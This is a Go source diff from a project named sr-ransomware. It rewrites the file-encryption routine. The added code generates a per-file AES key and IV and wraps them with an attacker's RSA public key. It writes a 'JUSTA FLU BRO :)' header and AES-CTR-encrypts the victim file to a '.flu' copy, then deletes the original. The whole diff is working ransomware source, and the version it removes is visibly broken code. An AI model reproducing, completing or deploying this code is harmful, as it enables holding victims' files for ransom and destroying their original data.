@@ -4,17 +4,17 @@ import (
     "os"
     "io"
     "io/ioutil"
-    "encoding/binary"
     "path/filepath"
     "crypto/cipher"
     "crypto/rand"
     "crypto/rsa"
     "crypto/aes"
 
-    "github.com/sug0/sr-ransomware/go/fs"
     "github.com/sug0/sr-ransomware/go/errors"
     "github.com/sug0/sr-ransomware/go/crypto/util"
 )
+
+const rsaKeyBits  = 2048
 
 func ImportPublicKey() (*rsa.PublicKey, error) {
     pkData, err := ioutil.ReadFile(filepath.Join(workDir, attackerPublicKey))
@@ -25,77 +25,8 @@ func ImportPublicKey() (*rsa.PublicKey, error) {
     return pk, errors.WrapIfNotNil(pkg, "failed to import RSA public key", err)
 }
 
-func EncryptFile(pk *rsa.PublicKey, path string) error {
-    // aes key stuff
-    aesKey, err := util.GenerateAES()
-    if err != nil {
-        return errors.Wrap(pkg, "failed to generate AES key", err)
-    }
-    aesIV, err := util.GenerateAES()
-    if err != nil {
-        return errors.Wrap(pkg, "failed to generate AES IV", err)
-    }
-    aesBlock, _ := aes.NewCipher(aesKey)
-    aesStream := cipher.NewCTR(aesBlock, aesIV)
-
-    err = writeEncrypted(pk, path, aesStream)
-    if err != nil {
-        return err
-    }
-
-    // remove original file
-    return errors.WrapIfNotNil(pkg, "failed to remove file", os.Remove(path))
-}
-
-func writeEncrypted(pk *rsa.PublicKey, path string, aesStream cipher.Stream) error {
-    n, err := encryptFile(pk, path, aesStream)
-
-    path = filepath.Base(path)
-    newPath := path + ".flu"
-    oldPath := path + ".flu.sniffle"
-
-    fEncrypted, err := os.Create(file)
-    if err != nil {
-        return 0, errors.Wrap(pkg, "failed to create file", err)
-    }
-    defer fEncrypted.Close()
-
-    err = io.WriteString(fEncrypted, "JUSTA FLU BRO :)")
-    if err != nil {
-        return errors.Wrap(pkg, "failed to write magic", err)
-    }
-}
-
-func encryptFile(pk *rsa.PublicKey, path string, aesStream cipher.Stream) (int64, error) {
-    path = filepath.Base(path)
-    newPath := path + ".flu.sniffle"
-
-    err := fs.Move(newPath, path)
-    if err != nil {
-        return 0, errors.Wrap(pkg, "failed to move victim file", err)
-    }
-
-    fOriginal, err := os.Open(path)
-    if err != nil {
-        return 0, errors.Wrap(pkg, "failed to open file", err)
-    }
-    defer fOriginal.Close()
-
-    fEncrypted, err := os.Create(newPath)
-    if err != nil {
-        return 0, errors.Wrap(pkg, "failed to create file", err)
-    }
-    defer fEncrypted.Close()
-
-    stream := cipher.StreamWriter{S: aesStream, W: fEncrypted}
-    n, err := io.Copy(stream, fOriginal)
-
-    if err != nil {
-        return 0, errors.Wrap(pkg, "failed to encrypte file with AES", err)
-    }
-    return n, nil
-}
-
+// Generate all the appropriate keys in the malware
+// work dir.
 func GenerateKeys() error {
     // global rsa key
     pk, err := ImportPublicKey()
@@ -104,11 +35,11 @@ func GenerateKeys() error {
     }
 
     // local rsa keys
-    sk, err := util.GenerateKeyRSA(2048)
+    sk, err := util.GenerateKeyRSA(rsaKeyBits)
     if err != nil {
         return errors.Wrap(pkg, "failed to generate RSA secret key", err)
     }
-    pkData, err = util.ExportDERPublicKeyRSA(&sk.PublicKey)
+    pkData, err := util.ExportDERPublicKeyRSA(&sk.PublicKey)
     if err != nil {
         return errors.Wrap(pkg, "failed to marshal RSA public key", err)
     }
@@ -153,4 +84,71 @@ func GenerateKeys() error {
     }
 
     return nil
+}
+
+// Encrypt a file.
+func EncryptFile(pk *rsa.PublicKey, path string) error {
+    err := encryptFile(pk, path)
+    if err != nil {
+        return err
+    }
+
+    // remove original file
+    return errors.WrapIfNotNil(pkg, "failed to remove file", os.Remove(path))
+}
+
+func encryptFile(pk *rsa.PublicKey, path string) error {
+    // new aes key
+    aesKey, err := util.GenerateAES()
+    if err != nil {
+        return errors.Wrap(pkg, "failed to generate AES key", err)
+    }
+    aesIV, err := util.GenerateAES()
+    if err != nil {
+        return errors.Wrap(pkg, "failed to generate AES IV", err)
+    }
+    aesBlock, _ := aes.NewCipher(aesKey)
+    aesStream := cipher.NewCTR(aesBlock, aesIV)
+
+    // load files
+    fOriginal, err := os.Open(path)
+    if err != nil {
+        return errors.Wrap(pkg, "failed to open file", err)
+    }
+    defer fOriginal.Close()
+
+    fEncrypted, err := os.Create(path + ".flu")
+    if err != nil {
+        return errors.Wrap(pkg, "failed to create file", err)
+    }
+    defer fEncrypted.Close()
+
+    // write magic
+    _, err = io.WriteString(fEncrypted, "JUSTA FLU BRO :)")
+    if err != nil {
+        return errors.Wrap(pkg, "failed to write magic", err)
+    }
+
+    // write encrypted AES key
+    encryptedKey, err := rsa.EncryptPKCS1v15(rand.Reader, pk, append(aesIV, aesKey...))
+    if err != nil {
+        return errors.Wrap(pkg, "failed encrypt AES key", err)
+    }
+    _, err = fEncrypted.Write(encryptedKey)
+    if err != nil {
+        return errors.Wrap(pkg, "failed to write encrypted AES key", err)
+    }
+
+    // write encrypted file
+    info, err := fOriginal.Stat()
+    if err != nil {
+        return errors.Wrap(pkg, "failed to stat file", err)
+    }
+    padding := util.GeneratePaddingBytes(int(info.Size()), aes.BlockSize)
+    stream := cipher.StreamWriter{S: aesStream, W: fEncrypted}
+    _, err = io.Copy(stream, fOriginal)
+    if err == nil {
+        _, err = stream.Write(padding)
+    }
+    return errors.WrapIfNotNil(pkg, "failed to encrypte file with AES", err)
 }
